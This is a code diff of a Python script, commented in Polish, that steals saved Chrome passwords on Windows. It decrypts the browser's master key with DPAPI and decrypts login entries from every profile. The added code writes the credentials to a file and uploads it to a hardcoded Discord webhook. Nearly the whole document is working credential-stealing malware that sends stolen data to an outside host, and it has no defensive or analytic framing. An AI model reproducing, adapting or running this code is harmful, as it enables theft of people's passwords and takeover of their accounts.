@@ -1,59 +1,94 @@
+
 import os
+import json
+import base64
 import sqlite3
 import shutil
 import win32crypt
-import json
+from Crypto.Cipher import AES
+import requests
 
-def get_chrome_profiles():
-    base_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data'
-    profiles = []
+def get_encryption_key(local_state_path):
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
+    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return key
 
-    # Dodaj wszystkie foldery profili, w tym "Default", "Profile 1", "Profile 2", itd.
-    for folder in os.listdir(base_path):
-        full_path = os.path.join(base_path, folder)
-        if os.path.isdir(full_path) and (folder == 'Default' or folder.startswith('Profile')):
-            profiles.append((folder, os.path.join(full_path, 'Login Data')))
-    return profiles
-
-def extract_passwords_from_db(db_path, profile_name):
-    extracted = []
+def decrypt_password(encrypted_password, key):
     try:
-        temp_db = os.path.join(os.getenv("TEMP"), f"LoginData_{profile_name}.db")
-        shutil.copy2(db_path, temp_db)
+        if encrypted_password[:3] == b'v10':
+            iv = encrypted_password[3:15]
+            payload = encrypted_password[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)[:-16]  # remove GCM tag
+            return decrypted.decode()
+        else:
+            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
+    except:
+        return "ERROR_DECRYPTING"
 
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for url, username, encrypted_password in cursor.fetchall():
-            try:
-                decrypted_data = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
-                password = decrypted_data.decode()
-            except Exception as e:
-                password = f"[Error decrypting: {str(e)}]"
-            extracted.append((url, username, password))
+def extract_passwords_from_profile(profile_path, key):
+    login_db = os.path.join(profile_path, 'Login Data')
+    if not os.path.exists(login_db):
+        return []
 
-        cursor.close()
-        conn.close()
-        os.remove(temp_db)
+    temp_db = os.path.join(os.getenv('TEMP'), 'Loginvault_temp.db')
+    shutil.copy2(login_db, temp_db)
 
-    except Exception as e:
-        extracted.append((f"[ERROR in {profile_name}]", "", str(e)))
-    return extracted
+    conn = sqlite3.connect(temp_db)
+    cursor = conn.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    logins = []
 
-def save_passwords_to_file(output_file, all_data):
+    for row in cursor.fetchall():
+        url, username, encrypted_password = row
+        if username or encrypted_password:
+            password = decrypt_password(encrypted_password, key)
+            logins.append((url, username, password))
+
+    cursor.close()
+    conn.close()
+    os.remove(temp_db)
+    return logins
+
+def extract_chrome_passwords(output_file):
+    base_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data"
+    local_state_path = os.path.join(base_path, 'Local State')
+
+    if not os.path.exists(local_state_path):
+        with open(output_file, 'w') as f:
+            f.write("Local State file not found.\n")
+        return
+
+    key = get_encryption_key(local_state_path)
+    profiles = ['Default']
+    profiles.extend([name for name in os.listdir(base_path) if name.startswith("Profile")])
+
+    all_logins = []
+    for profile in profiles:
+        profile_path = os.path.join(base_path, profile)
+        logins = extract_passwords_from_profile(profile_path, key)
+        all_logins.extend(logins)
+
     with open(output_file, 'w', encoding='utf-8') as f:
-        for profile, entries in all_data.items():
-            f.write(f"--- Profile: {profile} ---\n")
-            for url, user, pwd in entries:
-                f.write(f"URL: {url}\nUser: {user}\nPassword: {pwd}\n\n")
-            f.write("\n")
+        if not all_logins:
+            f.write("No passwords found.\n")
+        for url, user, pwd in all_logins:
+            f.write(f"URL: {url}\nUser: {user}\nPassword: {pwd}\n\n")
+
+def send_to_discord(filepath):
+    url = "https://discord.com/api/webhooks/1360942792540684438/8GkVbhnI8fPO6c8yeYN59KLuNAvCem_-50Bef334UkPn_gMrYMA0DWd3RxyliUPq6R8L"
+    with open(filepath, 'rb') as f:
+        files = {'file': (os.path.basename(filepath), f)}
+        response = requests.post(url, files=files)
+        if response.status_code == 204:
+            print("✅ Plik wysłany na Discorda.")
+        else:
+            print(f"❌ Błąd wysyłania: {response.status_code} - {response.text}")
 
 if __name__ == '__main__':
     output_path = os.path.join(os.path.expanduser('~'), 'Documents', 'chrome_passwords.txt')
-    all_profiles_data = {}
-    for profile_name, db_path in get_chrome_profiles():
-        if os.path.exists(db_path):
-            all_profiles_data[profile_name] = extract_passwords_from_db(db_path, profile_name)
-
-    save_passwords_to_file(output_path, all_profiles_data)
-    print(f"Zapisano hasła do: {output_path}")
+    extract_chrome_passwords(output_path)
+    send_to_discord(output_path)
